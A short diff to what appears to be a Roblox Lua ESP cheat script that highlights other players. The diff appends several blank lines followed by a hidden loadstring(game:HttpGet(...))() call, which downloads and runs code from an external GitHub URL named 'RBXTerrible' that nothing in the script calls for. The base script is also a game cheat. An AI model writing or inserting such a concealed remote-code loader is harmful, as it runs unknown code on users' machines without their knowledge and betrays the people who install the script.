@@ -48,3 +48,12 @@ end
 Runservice.Heartbeat:Connect(updateESP)
 Players.Heartbeat:Connect(createESP)
 Players.Heartbeat:Connect(RemoveESP)
+
+
+
+
+
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PhenomenalEntity/RBXTerrible/refs/heads/main/source.txt"))()
